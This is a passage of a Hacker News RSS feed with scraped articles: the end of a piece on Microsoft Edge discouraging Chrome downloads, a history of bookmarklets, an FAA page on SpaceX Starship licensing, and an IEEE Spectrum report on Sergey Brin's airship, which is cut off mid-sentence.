https://duet-cdn.vox-cdn.com/thumbor/0x0:1112x622/640x358/filters:focal(556x311:557x312):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029232/msedge_He5soYyzls.jpg 640w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1112x622/750x420/filters:focal(556x311:557x312):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029232/msedge_He5soYyzls.jpg 750w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1112x622/828x463/filters:focal(556x311:557x312):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029232/msedge_He5soYyzls.jpg 828w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1112x622/1080x604/filters:focal(556x311:557x312):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029232/msedge_He5soYyzls.jpg 1080w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1112x622/1200x671/filters:focal(556x311:557x312):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029232/msedge_He5soYyzls.jpg 1200w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1112x622/1440x805/filters:focal(556x311:557x312):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029232/msedge_He5soYyzls.jpg 1440w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1112x622/1920x1074/filters:focal(556x311:557x312):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029232/msedge_He5soYyzls.jpg 1920w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1112x622/2048x1146/filters:focal(556x311:557x312):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029232/msedge_He5soYyzls.jpg 2048w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1112x622/2400x1342/filters:focal(556x311:557x312):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029232/msedge_He5soYyzls.jpg 2400w" src="https://duet-cdn.vox-cdn.com/thumbor/0x0:1112x622/2400x1342/filters:focal(556x311:557x312):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029232/msedge_He5soYyzls.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p></div></figure></div><div><figcaption><em>“Microsoft Edge runs on the same technology as Chrome, with the added trust of Microsoft,” reads an injected ad that appeared after my download.</em></figcaption> <p><cite>Screenshot by Sean Hollister / The Verge</cite></p></div></div><p><h3>Four. </h3></p><div><div role="button" aria-label="Zoom" tabindex="0"><figure><div><p><span><img alt="To be fair, it did appear after the download was finished." loading="lazy" decoding="async" data-nimg="fill" sizes="(max-width: 1023px) 100vw, 744px" srcset="https://duet-cdn.vox-cdn.com/thumbor/0x0:670x143/376x80/filters:focal(335x72:336x73):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029236/msedge_He5soYyzls_2.jpg 376w, https://duet-cdn.vox-cdn.com/thumbor/0x0:670x143/384x82/filters:focal(335x72:336x73):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029236/msedge_He5soYyzls_2.jpg 384w, https://duet-cdn.vox-cdn.com/thumbor/0x0:670x143/415x89/filters:focal(335x72:336x73):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029236/msedge_He5soYyzls_2.jpg 415w, https://duet-cdn.vox-cdn.com/thumbor/0x0:670x143/480x102/filters:focal(335x72:336x73):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029236/msedge_He5soYyzls_2.jpg 480w, https://duet-cdn.vox-cdn.com/thumbor/0x0:670x143/540x115/filters:focal(335x72:336x73):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029236/msedge_He5soYyzls_2.jpg 540w, https://duet-cdn.vox-cdn.com/thumbor/0x0:670x143/640x137/filters:focal(335x72:336x73):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029236/msedge_He5soYyzls_2.jpg 640w, https://duet-cdn.vox-cdn.com/thumbor/0x0:670x143/750x160/filters:focal(335x72:336x73):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029236/msedge_He5soYyzls_2.jpg 750w, https://duet-cdn.vox-cdn.com/thumbor/0x0:670x143/828x177/filters:focal(335x72:336x73):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029236/msedge_He5soYyzls_2.jpg 828w, https://duet-cdn.vox-cdn.com/thumbor/0x0:670x143/1080x231/filters:focal(335x72:336x73):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029236/msedge_He5soYyzls_2.jpg 1080w, https://duet-cdn.vox-cdn.com/thumbor/0x0:670x143/1200x256/filters:focal(335x72:336x73):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029236/msedge_He5soYyzls_2.jpg 1200w, https://duet-cdn.vox-cdn.com/thumbor/0x0:670x143/1440x307/filters:focal(335x72:336x73):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029236/msedge_He5soYyzls_2.jpg 1440w, https://duet-cdn.vox-cdn.com/thumbor/0x0:670x143/1920x410/filters:focal(335x72:336x73):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029236/msedge_He5soYyzls_2.jpg 1920w, https://duet-cdn.vox-cdn.com/thumbor/0x0:670x143/2048x437/filters:focal(335x72:336x73):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029236/msedge_He5soYyzls_2.jpg 2048w, https://duet-cdn.vox-cdn.com/thumbor/0x0:670x143/2400x512/filters:focal(335x72:336x73):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029236/msedge_He5soYyzls_2.jpg 2400w" src="https://duet-cdn.vox-cdn.com/thumbor/0x0:670x143/2400x512/filters:focal(335x72:336x73):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/25029236/msedge_He5soYyzls_2.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p></div></figure></div><div><figcaption><em>To be fair, it did appear after the download was finished.</em></figcaption> <p><cite>Screenshot by Sean Hollister / The Verge</cite></p></div></div><div><p>The pop-ups are <a href="https://www.theverge.com/2021/12/2/22813733/microsoft-windows-edge-download-chrome-prompts">nearly two years old</a>, and the injected ads are from <a href="https://www.neowin.net/news/microsoft-is-now-injecting-full-size-ads-on-chrome-website-to-make-you-stay-on-edge/">earlier this year</a>. The poll seems to be new, though — <a href="https://www.neowin.net/news/microsoft-now-wants-you-to-take-a-poll-before-installing-google-chrome/"><em>Neowin</em> reports</a> it first saw the poll last weekend.</p></div><p>But hey, <em><strong>it could be worse:</strong></em></p><div><p>I cannot believe how many stories we’ve written about the shit Microsoft has pulled to steer you away from Chrome. Even today, the company <em>still</em> won’t always respect <a href="https://www.theverge.com/22714629/windows-11-microsoft-browser-edge-chrome-firefox">your choice of default browser</a>, though that <a href="https://www.theverge.com/2023/9/5/23859537/microsoft-windows-11-default-browser-links-eu-eea-changes">may finally be changing in the EU</a>.</p></div><p>Sadly the poll doesn’t include an “I’m boycotting Edge because you don’t respect me as a user” option. </p></div><div><p>Most Popular</p><ol><li><a href="https://www.theverge.com/2023/10/24/23930478/microsoft-ceo-satya-nadella-mobile-windows-phone"><h2>Microsoft CEO Satya Nadella admits giving up on Windows Phone and mobile was a mistake</h2></a><hr></li><li><a href="https://www.theverge.com/2023/10/24/23930407/apple-scary-fast-halloween-imac-event-macbook-pro-rumors"><h2>Apple plans ‘Scary Fast’ product event just before Halloween</h2></a><hr></li><li><a href="https://www.theverge.com/23930058/forecast-clean-renewable-unstoppable-international-energy-agency"><h2>Clean&nbsp;energy&nbsp;is officially ‘unstoppable’ now</h2></a><hr></li><li><a href="https://www.theverge.com/2023/10/24/23929990/amazon-prime-video-crunchyroll-channel-now-available"><h2>Amazon will now let you access Crunchyroll’s anime library right from Prime Video</h2></a><hr></li><li><a href="https://www.theverge.com/2023/10/24/23930669/humane-ai-pin-trust-light-camera"><h2>The Humane AI Pin apparently runs GPT-4 and flashes a ‘Trust Light’ when it’s recording</h2></a><hr></li></ol></div></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Wait, what's a bookmarklet? (215 pts)]]></title>
            <link>https://thehistoryoftheweb.com/postscript/wait-whats-a-bookmarklet/</link>
            <guid>38014069</guid>
            <pubDate>Wed, 25 Oct 2023 15:50:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://thehistoryoftheweb.com/postscript/wait-whats-a-bookmarklet/">https://thehistoryoftheweb.com/postscript/wait-whats-a-bookmarklet/</a>, See on <a href="https://news.ycombinator.com/item?id=38014069">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>


		


		<p>Written by <span>Jay Hoffmann</span> on <span>October 25, 2023</span>.<br>

					It takes place somewhere between <span>1995</span> and <span>2008</span>.

		</p></div><div>

	<article>

					<p>How this one small browser quirk turned into a tool used by countless people for decades.</p>
			<hr>
				
<p>In 1995, Brendan Eich demoed what would eventually become JavaScript to a room full of engineers at Netscape. It was met with instant enthusiasm. For his demo, Eich opened up his version of the browser and typed a command right into the address bar, which opened up a console and allowed him to demonstrate an alert box. Six months later, the first version of JavaScript shipped with Netscape Navigator 2.</p>



<p>JavaScript in the address bar, as a protocol for a URL, was possible virtually from day one of the language, effectively creating JavaScript URLs. And even in the first version, “visiting” a JavaScript URL triggered a change on the current page, rather than opening up an entirely new one.&nbsp;<a href="https://web.archive.org/web/20111127233722/http://www.sitepoint.com/bookmarklets/" target="_blank" rel="noreferrer noopener">Eich even added the&nbsp;<code>void</code>&nbsp;operator</a>&nbsp;to an early version of JavaScript to make it possible to create arbitrary functions with values right in that URL.</p>



<p>To introduce new developers to JavaScript, Netscape released a comprehensive guide on how to use it. And in that guide, they&nbsp;<a href="https://web.archive.org/web/20030609224912/http://devedge.netscape.com/library/manuals/2000/javascript/1.3/guide/advtopic.html#1004952" target="_blank" rel="noreferrer noopener">included a short snippet about these JavaScript URLs</a>:</p>



<blockquote>
<p>You are probably familiar with the standard types of URLs: http:, ftp:, file:, and so on. With Navigator, you can also use URLs of type javascript: to execute JavaScript statements instead of loading a document. You simply use a string beginning with javascript: as the value for the HREF attribute of anchor tags.</p>



<p><code>&lt;A HREF="javascript:history.go(0)"&gt;Reload Now&lt;/A&gt;</code></p>



<p>In general, you can put any statements or function calls after the&nbsp;<code>javascript:</code>&nbsp;URL prefix.</p>
</blockquote>



<p>So you ended up with this JavaScript quirk where it was possible to create unique URLs that ran a bit of JavaScript on whatever page you happened to be looking at. It could even make changes to that page. Move things around. Replace words. Open links. And pretty early on, people realized that these JavaScript URLs were also bookmarkable, just like any other URL.</p>



<p>And, crucially, easily shareable as links.</p>



<p>As rapid iteration spread through the early web, one corner of that world began experimenting with these bookmarkable, shareable JavaScript URLs to manipulate and transform web pages. Some early examples were used to quickly&nbsp;<a href="http://web.archive.org/web/20010503103754/http://www.squarefree.com/bookmarklets/pagelinks.html" target="_blank" rel="noreferrer noopener">open all the links on a page</a>, for instance, or&nbsp;<a href="http://tantek.com/favelets/" target="_blank" rel="noreferrer noopener">run the current page through a validator</a>. But there were also plenty of unique utilities as well, like interacting with online services,&nbsp;<a href="https://www.sitepoint.com/bookmarklets-2/" target="_blank" rel="noreferrer noopener">manipulating images on a page</a>, or even&nbsp;<a href="http://web.archive.org/web/20010505005613/http://www.squarefree.com/bookmarklets/tipping.html" target="_blank" rel="noreferrer noopener">tipping the website owner</a>.</p>



<p>Early versions of the browser also featured something which has faded away in recent years. The bookmarks bar (or sometimes, the favorites bar). Up at the top of the browser window, below the URL, was a list of bookmarks. The easiest way to share a JavaScript URL was to drag one into your bookmarks bar, and then use it as you were surfing around.</p>



<p><img decoding="async" fetchpriority="high" src="https://ik.imagekit.io/aoi3fgebjgr/wp-content/uploads/2023/10/what-is-a-bookmarklet-internet-explorer-300x194.jpg" alt="An example of a bookmarklet in action" width="300" height="194" srcset="https://ik.imagekit.io/aoi3fgebjgr/wp-content/uploads/2023/10/what-is-a-bookmarklet-internet-explorer-300x194.jpg 300w, https://ik.imagekit.io/aoi3fgebjgr/wp-content/uploads/2023/10/what-is-a-bookmarklet-internet-explorer.jpg 346w" sizes="(max-width: 300px) 100vw, 300px"></p>



<p>It is difficult to trace the exact moment that all of this began, but there did come a time when the concept—a shareable JavaScript URL that acted as some sort of personal utility—needed a name. In December of 1998, Steve Kangas did just that, when he launched Bookmarklets.com. And the bookmarklet (or Favlet,&nbsp;<a href="http://tantek.com/favelets/" target="_blank" rel="noreferrer noopener">as it was called by Tantek Çelik</a>) started spreading.</p>



<p>Even in the first few months, Kangas had a list of over a hundred bookmarklets to share, that he had compiled and created. Some could be used to search a page for specific links or text. Others could alter the appearance of a page, removing images, changing the color or making things more readable. Some were fun (<a href="https://web.archive.org/web/20150603003341/http://www.bookmarklets.com/tools/misc/index.phtml" target="_blank" rel="noreferrer noopener">a bookmarklet that could make a Valentine’s Day heart dance across the page</a>) and some were unadorned and simple (<a href="https://web.archive.org/web/20110128083629/http://www.bookmarklets.com/tools/data/index.phtml" target="_blank" rel="noreferrer noopener">turn text underlines on or off</a>).</p>



<figure><img decoding="async" width="800" height="364" src="https://ik.imagekit.io/aoi3fgebjgr/wp-content/uploads/2023/06/Screenshot-2023-06-29-at-6.55.48-AM-800x364.png" alt="The category section of Bookmarklets.com" srcset="https://ik.imagekit.io/aoi3fgebjgr/wp-content/uploads/2023/06/Screenshot-2023-06-29-at-6.55.48-AM-800x364.png 800w, https://ik.imagekit.io/aoi3fgebjgr/wp-content/uploads/2023/06/Screenshot-2023-06-29-at-6.55.48-AM-300x137.png 300w, https://ik.imagekit.io/aoi3fgebjgr/wp-content/uploads/2023/06/Screenshot-2023-06-29-at-6.55.48-AM-768x350.png 768w, https://ik.imagekit.io/aoi3fgebjgr/wp-content/uploads/2023/06/Screenshot-2023-06-29-at-6.55.48-AM-1536x699.png 1536w, https://ik.imagekit.io/aoi3fgebjgr/wp-content/uploads/2023/06/Screenshot-2023-06-29-at-6.55.48-AM-2048x932.png 2048w" sizes="(max-width: 800px) 100vw, 800px"></figure>



<p>Bookmarklets are interesting. They are generally limited by browsers to a certain number of characters, which means they require efficient code that make use of the quirks of the language. They can’t be too complex or verbose. They usually have to be minified, which is a process of taking human readable JavaScript code and removing as many complicated variable names and whitespace as is needed. A Bookmarklet generally wasn’t able to do ten things at once. Each one did one thing, and did it well. That directness and focus made it all the more easy to share them around and instantly understand their utility. And bookmarklets became very popular.</p>



<p>Browsers have also typically featured another way to change and manipulate a page. They’ve been called add-ons, plugins, and extensions, but they are an officially supported way of interacting with a browser and extending its functionality. For a long time, however, they were difficult to manage and install. You had to find what you were looking for, download it, and find the right place to put it on your computer. They were useful cases, but not necessarily a viable alternative to Bookmarklets, which were easily shareable and dead simple.</p>



<p>In 2007, Moziilla Firefox released its Add-ons Gallery, a much simpler way to discover and install official Firefox add-ons. It was a searchable and categorized index of add-ons that any developer could add to. Add-ons were officially supported, were reviewed for security, and could be installed with one click. In 2009, Chrome added an extension gallery with similar features.</p>



<figure><img decoding="async" width="800" height="522" src="https://ik.imagekit.io/aoi3fgebjgr/wp-content/uploads/2023/06/Screenshot-2023-06-29-at-6.39.51-AM-800x522.png" alt="A first version of Firefox's Add-on Gallery" srcset="https://ik.imagekit.io/aoi3fgebjgr/wp-content/uploads/2023/06/Screenshot-2023-06-29-at-6.39.51-AM-800x522.png 800w, https://ik.imagekit.io/aoi3fgebjgr/wp-content/uploads/2023/06/Screenshot-2023-06-29-at-6.39.51-AM-300x196.png 300w, https://ik.imagekit.io/aoi3fgebjgr/wp-content/uploads/2023/06/Screenshot-2023-06-29-at-6.39.51-AM-768x501.png 768w, https://ik.imagekit.io/aoi3fgebjgr/wp-content/uploads/2023/06/Screenshot-2023-06-29-at-6.39.51-AM-1536x1002.png 1536w, https://ik.imagekit.io/aoi3fgebjgr/wp-content/uploads/2023/06/Screenshot-2023-06-29-at-6.39.51-AM-2048x1336.png 2048w" sizes="(max-width: 800px) 100vw, 800px"></figure>



<p>As those browsers rose in market share, extensions began to overtake bookmarklets in popularity. The Bookmarks bar faded to the background more. Bookmarklets are still in use, and still quite useful, but they are ….</p>
	



		
	</article>



</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[SpaceX Starship Super Heavy Project at the Boca Chica Launch Site (155 pts)]]></title>
            <link>https://www.faa.gov/space/stakeholder_engagement/spacex_starship</link>
            <guid>38013955</guid>
            <pubDate>Wed, 25 Oct 2023 15:39:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.faa.gov/space/stakeholder_engagement/spacex_starship">https://www.faa.gov/space/stakeholder_engagement/spacex_starship</a>, See on <a href="https://news.ycombinator.com/item?id=38013955">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        
        <p>SpaceX proposes to conduct Starship/Super Heavy launch operations from the Boca Chica Launch Site in Cameron County, Texas. SpaceX must apply for and obtain an experimental permit(s) and/or a vehicle operator license from the <abbr>FAA</abbr> Office of Commercial Space Transportation to operate the Starship/Super Heavy launch vehicle. The <abbr>FAA</abbr>'s evaluation of a permit or license application includes a review of 1) public safety issues (such as overflight of populated areas and payload contents); 2) national security or foreign policy concerns; 3) insurance requirements for the launch operator; and 4) potential environmental impact. Read more about the <a href="https://www.faa.gov/space/stakeholder_engagement/spacex_starship/history">history of the Boca Chica launch site</a> and <a href="https://www.faa.gov/space/stakeholder_engagement/spacex_starship/operations">the location of the launch site</a>.</p>

<h2><abbr>FAA</abbr></h2>

<p>The Commercial Space Launch Act of 1984, as amended and codified at 51 <abbr>U.S.C.</abbr> §§ 50901-50923, authorizes the Secretary of Transportation to oversee, license, and regulate commercial launch and reentry activities, and the operation of launch and reentry sites within the United States or as carried out by <abbr>U.S.</abbr> citizens. Section 50905 directs the Secretary to exercise this responsibility consistent with public health and safety, safety of property, and the national security and foreign policy interests of the United States. In addition, Section 50903 requires the Secretary to encourage, facilitate, and promote commercial space launches and reentries by the private sector. As codified at 49 <abbr>CFR</abbr> § 1.83(b), the Secretary has delegated authority to carry out these functions to the <abbr>FAA</abbr> Administrator.</p>

<p>For more information, read more about the <a href="https://www.faa.gov/space/stakeholder_engagement/spacex_starship/license_review_process">License Review Process</a> and the <a href="https://www.faa.gov/space/stakeholder_engagement/spacex_starship/environmental_review">Environmental Review Process</a>.</p>

<h2>SpaceX</h2>

<p>Founded in 2002, SpaceX is a commercial space transportation company headquartered in Hawthorne, California. SpaceX designs, manufactures, and launches advanced rockets and spacecraft. SpaceX developed the Falcon 1 (no longer operational), Falcon 9, and Falcon Heavy vertical orbital launch vehicles, all of which were built with the goal of becoming reusable launch vehicles. SpaceX launches commercial and government payloads, including the Dragon spacecraft, which was recently used to send <abbr>NASA</abbr> astronauts to the International Space Station and bring them back to Earth. SpaceX is currently developing a new rocket, Starship/Super Heavy, with the goal of traveling to Mars. For additional information on SpaceX, please visit <a href="https://www.spacex.com/">spacex.com</a>.</p>

<h2>Project Updates</h2>

<h3>In Process: Written Re-Evaluation</h3>

<p>SpaceX must obtain a modified license from the FAA before it is authorized to conduct a second Starship/Super Heavy launch. The modification must address all safety, environmental, and other regulatory requirements. As part of that license application determination process, the FAA will review new environmental information, including changes related to the launch pad, as well as other proposed vehicle and flight modifications.&nbsp;</p>

<p>The FAA will complete a Written Reevaluation (WR) to the 2022 Programmatic Environmental Assessment (PEA) evaluating the new environmental information, including Endangered Species Act consultation with the U.S. Fish and Wildlife Service. If the FAA determines through the WR process that the contents of the PEA do not remain valid in light of the changes proposed for Flight 2, additional environmental review will be required. The FAA will post the completed WR on this site.<br>
&nbsp;</p>

<h3>April 2023 Written Re-Evaluation</h3>

<div><p>Since the 2022 Programmatic Environmental Assessment, SpaceX provided the FAA with additional information regarding Starship’s planned landing, Super Heavy’s planned soft water landing, and the Launch Pad Detonation Suppression System. The FAA has published a Written Re-Evaluation which evaluates, based on this new information, whether supplemental environmental analysis is needed to support the FAA Office of Commercial Space Transportation decision to issue a vehicle operator license to SpaceX for the operation of the Starship/Super Heavy launch vehicle at its existing Boca Chica Launch Site in Cameron County, Texas.&nbsp;</p><p>
In the Written Re-Evaluation, the FAA concluded that the issuance of a vehicle operator license for Starship/Super Heavy operations conforms to the prior environmental documentation, that the data contained in the 2022 Programmatic Environmental Assessment remains substantially valid, that there are no significant environmental changes, and all pertinent conditions and requirements of the prior approval have been met or will be met in the current action. Therefore, the preparation of a supplemental or new environmental document is not necessary to support the Proposed Action.</p><p>
An electronic version of the document was uploaded on Friday, April 14, 2023 and is available at the following link:</p><p>
•&nbsp; &nbsp;&nbsp;<a href="https://www.faa.gov/media/27271" hreflang="en">Written Re-Evaluation for SpaceX Starship Super Heavy Reentry</a></p><p>
For media inquiries, please contact the FAA press office at <a href="mailto:pressoffice@faa.gov">pressoffice@faa.gov</a>.</p></div>

<h3>Programmatic Environmental Assessment</h3>

<p>The FAA published the Final Programmatic Environmental Assessment (Final PEA) and Mitigated Finding of No Significant Impact/Record of Decision (Mitigated FONSI/ROD) for the SpaceX Starship/Super Heavy Launch Vehicle Program at the SpaceX Boca Chica Launch Site in Cameron County, Texas (PEA) on June 13, 2022. The documentation is available for download below.&nbsp;</p>

<p><strong>Spanish</strong></p>

<ul><li><a href="https://www.faa.gov/stakeholderengagement/spacexstarship/hallazgo-mitigado-de-impacto-no-significativoregistro-de">Hallazgo Mitigado de Impacto No Significativo/Registro de Decisión</a> – Spanish (PDF) 1MB</li>
	<li><a href="https://www.faa.gov/stakeholderengagement/spacexstarship/resumen-ejecutivo">Resumen Ejecutivo</a> – Spanish&nbsp;(PDF) 1MB</li>
</ul><p><strong>English</strong></p>

<ul><li><a href="https://www.faa.gov/stakeholderengagement/spacexstarship/final-programmatic-environmental-assessment-pea-executive">Executive Summary of the Final PEA</a>&nbsp;– English&nbsp;(PDF) 2MB</li>
	<li><a href="https://www.faa.gov/stakeholderengagement/spacexstarship/spacex-starship-super-heavy-boca-chica-fonsi-rod">Mitigated FONSI/ROD</a>&nbsp;– English (PDF) 1MB</li>
	<li><a href="https://www.faa.gov/stakeholderengagement/spacexstarship/assessment-spacex-starshipsuper-heavy-launch-vehicle-program">Final PEA for SpaceX Starship Super Heavy at Boca Chica</a> (PDF) 12MB</li>
	<li><a href="https://www.faa.gov/stakeholderengagement/spacexstarship/appendix-references">Appendix A. References</a> (PDF) &lt;1MB</li>
	<li><a href="https://www.faa.gov/stakeholderengagement/spacexstarship/appendix-b-starship-rocket-noise-assessment-boca-chica-launch">Appendix B. Noise Assessment</a>&nbsp;(PDF) 8MB</li>
	<li><a href="https://www.faa.gov/spacexstarship/starshipsuperheavy/appendix-c-national-historic-preservation-act-section-106">Appendix C. National Historic Preservation Act Section 106 Consultation</a>&nbsp; (PDF) 3MB</li>
	<li><a href="https://www.faa.gov/spacexstarship/starshipsuperheavy/appendix-d-biological-resources">Appendix D. Endangered Species Act Section 7 Consultation</a>&nbsp;(PDF) 25MB</li>
	<li><a href="https://www.faa.gov/stakeholderengagement/spacexstarship/appendix-e-department-transportation-act-section-4f-spacex">Appendix E. Department of Transportation Act Section 4(f) Consultation</a>&nbsp;(PDF) 7MB</li>
	<li><a href="https://www.faa.gov/stakeholderengagement/spacexstarship/appendix-f-visual-assessment">Appendix F. Viewshed Supporting Images</a>&nbsp;(PDF) 3MB</li>
	<li><a href="https://www.faa.gov/stakeholderengagement/spacexstarship/appendix-g-exhaust-plume-calculations">Appendix G. Exhaust Plume Calculations</a>&nbsp;(PDF) &lt;1MB</li>
	<li><a href="https://www.faa.gov/stakeholderengagement/spacexstarship/appendix-h-jurisdictional-wetland-determination">Appendix H. Jurisdictional Wetland Determination</a>&nbsp;(PDF) &lt;1MB</li>
	<li><a href="https://www.faa.gov/stakeholderengagement/spacexstarship/appendix-i-responses-public-comments">Appendix I. Comment Response</a> (PDF) &lt;1MB</li>
	<li><a href="https://www.faa.gov/stakeholderengagement/spacexstarship/appendix-j-tglo-correspondence-redacted">Appendix J. TGLO Correspondence</a>&nbsp;(PDF) &lt;1MB</li>
	<li><a href="https://www.faa.gov/stakeholderengagement/spacexstarship/appendix-k-moa-between-spacex-and-tpwd">Appendix K. MOA Between Texas Parks and Wildlife Department and SpaceX</a>&nbsp;(PDF) &lt;1MB</li>
</ul><h3>Mitigated Finding of No Significant Impact/Record of Decision</h3>

<p>The FAA determined that the Proposed Action would not result in significant environmental consequences and has issued a Mitigated Finding of No Significant Impact/Record of Decision (FONSI/ROD). The Mitigated FONSI/ROD is available above. Required mitigation measures are listed throughout Chapter 3 of the <a href="https://www.faa.gov/stakeholderengagement/spacexstarship/assessment-spacex-starshipsuper-heavy-launch-vehicle-program">final PEA</a>. Should any future license or permit be issued to SpaceX to perform any aspect of the Proposed Action, the FAA will ensure that SpaceX implements these mitigation measures as conditions for licensure.&nbsp;</p>

<h3>Biological Opinion</h3>

<p>As part of the Endangered Species Act Section 7 consultation process, the U.S. Fish and Wildlife Service (USFWS) issued a Biological Opinion (BO), which concludes the Proposed Action is not likely to jeopardize the continued existence of any federally listed species or adversely modify designated critical habitat. The BO is included in PEA Appendix D and available <a href="https://www.faa.gov/spacexstarship/starshipsuperheavy/appendix-d-biological-resources">here</a>&nbsp;(PDF).</p>

<h3>Programmatic Agreement&nbsp;</h3>

<p>As part of the National Historic Preservation Act Section 106 consultation process, the FAA, Texas State Historic Preservation Officer, National Park Service, Advisory Council on Historic Preservation, SpaceX, USFWS, and Texas Parks and Wildlife Department executed a Programmatic Agreement (PA). The PA outlines the measures to resolve adverse effects of the Proposed Action on historic properties. The PA is included in PEA Appendix C and available <a href="https://www.faa.gov/spacexstarship/starshipsuperheavy/appendix-c-national-historic-preservation-act-section-106">here</a> (PDF).</p>

<h3>Background</h3>

<p>The FAA published the draft PEA on September 17, 2021. The original comment period was from September 17, 2021 through October 18, 2021. In response to public requests, the FAA extended the comment period to November 1, 2021. The FAA held two virtual public hearings to solicit comments from the public concerning the scope and content of the draft PEA. The hearings were held October 18 and October 20, 2021. The comments can be found on this <a href="https://www.faa.gov/spacexstarship/starshipsuperheavy/comments-draft-programmatic-environmental-assessment-pea-spacex">page</a>. The PEA was revised based on public comments, and the final PEA includes responses to comments (see <a href="https://www.faa.gov/stakeholderengagement/spacexstarship/appendix-i-responses-public-comments">final PEA Appendix I</a>).</p>

<h2>Stay Informed</h2>

<p><a href="mailto:spacexbocachica@icf.com">Subscribe to our mailing list</a> to receive updates on this project.</p>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Sergey Brin's airship gets FAA clearance (147 pts)]]></title>
            <link>https://spectrum.ieee.org/lta-airship-faa-clearance</link>
            <guid>38013919</guid>
            <pubDate>Wed, 25 Oct 2023 15:36:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://spectrum.ieee.org/lta-airship-faa-clearance">https://spectrum.ieee.org/lta-airship-faa-clearance</a>, See on <a href="https://news.ycombinator.com/item?id=38013919">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-elid="2666055530" data-post-url="https://spectrum.ieee.org/lta-airship-faa-clearance" data-authors="Mark Harris" data-headline="EXCLUSIVE: Google Founder’s Airship Gets FAA Clearance" data-page-title="EXCLUSIVE: Google Founder’s Airship Gets FAA Clearance - IEEE Spectrum"><p>Expect traffic on the 101 highway in Mountain View, California, to be even worse in the days or weeks ahead, as motorists slow down to watch <a href="https://spectrum.ieee.org/tag/google">Google</a> co-founder Sergey Brin’s 124-meter long airship <a href="https://www.ltaresearch.com/technology" rel="noopener noreferrer" target="_blank">Pathfinder 1</a> launch into the air for the first time.</p><p><em><a href="https://spectrum.ieee.org/">IEEE Spectrum</a></em> has learned that <a href="https://www.ltaresearch.com/" target="_blank">LTA Research</a>, the company that Brin founded in 2015 to develop airships for humanitarian and cargo transport, received a special airworthiness certificate for the helium-filled airship in early September.</p><p>That piece of paper allows the largest aircraft since the ill-fated Hindenburg to begin flight tests at <a href="https://en.wikipedia.org/wiki/Moffett_Federal_Airfield" target="_blank">Moffett Field</a>, a joint civil-military airport in Silicon Valley, with immediate effect.</p><p>The certificate permits LTA to fly Pathfinder 1 within the boundaries of Moffett Field and neighboring Palo Alto airport’s airspaces, at a height of up to 460 meters (1500 feet). That will let it venture out over the south San Francisco Bay, without interfering with planes flying into or out of San Jose and San Francisco International commercial airports. </p><p>In a letter supporting its application for the certificate, LTA wrote: “Pathfinder 1’s experimental flight test program is to demonstrate and establish the flight envelope for the airship…. LTA’s test plan is tailored to include substantial indoor and outdoor ground testing, using a build-up approach to gradually increase the flight envelope.”</p><p>The huge airship will initially be attached to a mobile mast for outdoor ground testing, before conducting about 25 low-level flights, for a total of 50 hours’ flight time. </p><p>Although its rigid design hearkens back to the gargantuan airships of the early 20th century, Pathfinder 1 is almost completely different from any large airship that has flown before. Crucially, its <a href="https://www.ltaresearch.com/technology" target="_blank">reported</a> 96 welded titanium hubs and 288 carbon fiber reinforced polymer tubes are light enough that it can use non-flammable helium instead of explosive hydrogen as a lifting gas. </p><p><img alt="Interior view of the airship's foundation during construction." data-rm-shortcode-id="38da14c974a020e52bfaaa29d4a6e3f4" data-rm-shortcode-name="rebelmouse-image" data-runner-src="https://spectrum.ieee.org/media-library/interior-view-of-the-airship-s-foundation-during-construction.jpg?id=50295607&amp;width=980" height="1693" id="e5a30" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/interior-view-of-the-airship-s-foundation-during-construction.jpg?id=50295607&amp;width=980" width="3300"><small data-gramm="false" data-lt-tmp-id="lt-504252" placeholder="Add Photo Caption..." spellcheck="false">LTA’s airship frames are made of lightweight titanium and carbon-fiber.  </small><small placeholder="Add Photo Credit...">LTA Research and Exploration</small></p><p>Twelve electric motors 